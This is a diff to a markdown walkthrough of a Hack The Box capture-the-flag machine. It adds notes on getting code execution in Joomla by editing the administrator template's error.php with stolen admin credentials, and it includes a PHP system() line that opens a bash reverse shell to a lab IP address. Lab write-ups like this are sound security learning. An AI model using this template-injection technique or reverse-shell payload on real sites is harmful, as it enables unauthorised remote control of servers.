@@ -89,8 +89,15 @@ DB encryption 0
 Obtained joomla user and pass. No ssh login with pwnd credentials.
 ![imagen](https://github.com/PolGs/HTB-Open-Beta-Season-III/assets/19478700/ebf0cdb9-cac6-4fd7-baea-b36bf1ebda61)
 
-Now an RCE would be nice. Or just some arbitrary file reads.
+Now an CE would be nice. Or just some arbitrary file reads.
+Using templates change php and then execute by making req
+http://dev.devvortex.htb/administrator/templates/atum/error.php
+Used bash -c wrapper otherwise session dies instantly.
+```s
+system('bash  -c "sh -i >& /dev/tcp/10.10.16.26/9898 0>&1"');
+```
 
+![imagen](https://github.com/PolGs/HTB-Open-Beta-Season-III/assets/19478700/ced2881a-0a71-466d-b030-37355627a0af)
 
 
 
